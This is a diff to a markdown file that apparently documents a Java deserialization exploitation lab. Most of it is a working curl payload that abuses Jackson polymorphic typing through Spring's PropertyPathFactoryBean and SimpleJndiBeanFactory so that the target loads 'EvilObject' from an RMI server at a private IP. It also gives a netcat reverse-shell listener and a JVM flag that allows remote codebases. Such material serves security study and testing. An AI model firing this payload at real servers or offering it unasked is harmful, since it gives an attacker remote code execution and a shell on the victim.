@@ -14,12 +14,11 @@ java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.JsonIO -a -v
 
 Exploitation Code
 ```
-curl -x "" -H "Content-Type: application/json" -X POST -d "{[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://localhost:1389/obj\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://localhost:1389/obj\"]}]}]}" http://localhost:31337/api/json
+curl -x "" -H "Content-Type: application/json" -X POST -d '{"id":133,"object":["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"rmi://192.168.34.42:1099/EvilObject","propertyPath":"foo","beanFactory": ["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://192.168.34.42:1099/EvilObject"]}]}]}' http://192.168.34.9:8443/api/jackson
 ```
-
 Reverse Shell
 ```
-ncat -lkvp 1389
+netcat -lkvp 31338
 ```
 
 The vulnerable endpoint needs the permission to download the evil class file located in /exploit/EvilObject.class
@@ -29,3 +28,9 @@ The vulnerable endpoint needs the permission to download the evil class file loc
 ```
 -Dcom.sun.jndi.rmi.object.trustURLCodebase=true
 ```
+
+#### Deserialization Details
+
+##### Jackson
+
+Jackson needs to enable the [JacksonPolymorphicDeserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization) to be affected against the deserialization vulnerability.
